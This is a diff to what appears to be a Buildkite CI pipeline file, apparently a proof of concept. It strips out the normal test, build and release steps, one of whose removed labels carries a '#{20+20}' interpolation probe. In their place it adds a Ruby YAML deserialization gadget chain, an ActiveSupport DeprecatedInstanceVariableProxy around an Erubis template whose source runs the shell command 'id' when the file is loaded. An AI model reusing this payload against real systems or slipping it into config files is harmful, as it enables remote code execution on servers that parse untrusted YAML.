@@ -1,38 +1,7 @@
-steps:
-  - label: '`#{20+20}`' Tests'
-    command: 'scripts/tests.sh'
-    env:
-      BUILDKITE_DOCKER_COMPOSE_CONTAINER: app
-
-  - wait
-
-  - label: ':package: Package'
-    command: 'scripts/build-binaries.sh'
-    artifact_paths: 'pkg/*'
-    env:
-      BUILDKITE_DOCKER_COMPOSE_CONTAINER: app
-
-  - wait
-
-  - label: ':debian: Publish'
-    command: 'scripts/build-debian-packages.sh'
-    artifact_paths: 'deb/**/*'
-    branches: 'master'
-    agents:
-      queue: 'deploy'
-
-  - block: ':shipit: Release'
-    branches: 'master'
-
-  - label: ':github: Release'
-    command: 'scripts/build-github-release.sh'
-    artifact_paths: 'releases/**/*'
-    branches: 'master'
-
-  - wait
-
-  - label: ':whale: Update images'
-    command: 'scripts/release-docker.sh'
-    branches: 'master'
-    agents:
-      queue: 'deploy'
+---
+steps: ''
+exploit: !ruby/object:ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
+  instance: !ruby/object:Erubis::Eruby
+    src: "%x{id}; 1"
+  method: :result
+  var: "@result"
